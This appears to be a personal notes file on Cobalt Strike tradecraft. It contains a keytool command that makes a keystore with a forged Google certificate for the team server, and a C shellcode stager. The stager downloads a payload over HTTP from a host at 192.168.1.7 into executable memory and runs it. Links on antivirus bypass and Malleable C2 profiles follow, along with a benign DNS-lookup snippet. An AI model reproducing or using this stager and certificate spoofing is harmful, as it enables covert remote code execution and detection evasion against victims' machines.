keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias Google.com -dname "CN=Google, OU=Google IT, O=Google Corporation, L=Mountain View, S=Santa Clara, C=US"


#include<Windows.h>
#include<wininet.h>
#pragma comment (lib, "wininet.lib")
int main() {
	HINTERNET Session = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET con = InternetConnectA(Session, "192.168.1.7", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HINTERNET Http = HttpOpenRequestA(con, "GET", "/index.html", "HTTP/1.1", NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, NULL);
	HttpSendRequest(Http, NULL, NULL, NULL, NULL);
	LPVOID a = VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD dwRealWord;

	for (int i = 0; i < 32; i++) {
		BOOL response = InternetReadFile(Http, (LPVOID)((int)a + i * 0x2000), 0x2000, &dwRealWord);
	}
	((void(*)())a)();
	return 0;
}

https://www.macchiato.ink/hst/bypassav/imitation_cs/
https://paper.seebug.org/1349/
https://github.com/rsmudge/Malleable-C2-Profiles/tree/master/APT
https://blog.csdn.net/weixin_39525355/article/details/111263172
https://blog.csdn.net/m0_50526465/article/details/116465013


#include <stdio.h>
#include <assert.h>
#include <WS2tcpip.h>
#include <WinSock2.h>

#pragma comment(lib, "Ws2_32.lib")

const char* domain = "www.baidu.com";

int main()
{
	int n_error = 0;
	WSADATA wsadata;
	n_error = WSAStartup(MAKEWORD(2, 2), &wsadata);
	//assert(n_error != 0);

	in_addr remote_addr;
	hostent* hptr = NULL;
	char** pptr;
	char str[MAX_PATH];

	if ((hptr = (hostent*)gethostbyname(domain)) == NULL) {
		int n_err = WSAGetLastError();
		return 0;
	}

	if (hptr->h_addrtype == AF_INET) {
		pptr = hptr->h_addr_list;
		for (; *pptr != NULL; pptr++) {
			printf("%s\n", inet_ntop(hptr->h_addrtype, *pptr, str, sizeof(str)));
		}
	}

	return 0;
}
